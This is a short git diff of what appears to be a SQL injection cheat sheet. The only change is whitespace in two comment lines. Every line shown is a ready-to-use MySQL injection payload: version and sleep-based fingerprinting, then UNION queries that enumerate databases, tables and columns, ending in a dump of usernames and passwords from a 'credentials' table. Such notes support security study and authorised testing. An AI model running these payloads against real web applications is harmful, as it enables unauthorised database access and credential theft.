@@ -42,8 +42,8 @@ UNION select username, NULL, NULL, 'raman' from raman-- -
 SELECT @@version #Fingerprint MySQL with query output
 SELECT SLEEP(5) #Fingerprint MySQL with no output
 cn' UNION select 1,database(),2,3-- - #Current database name
-cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -	#List all databases
+cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- - #List all databases
 cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- - #List all tables in a specific database
-cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -	#List all columns in a specific table
+cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- - #List all columns in a specific table
 cn' UNION select 1, username, password, 4 from dev.credentials-- - #Dump data from a table in another database
 ```
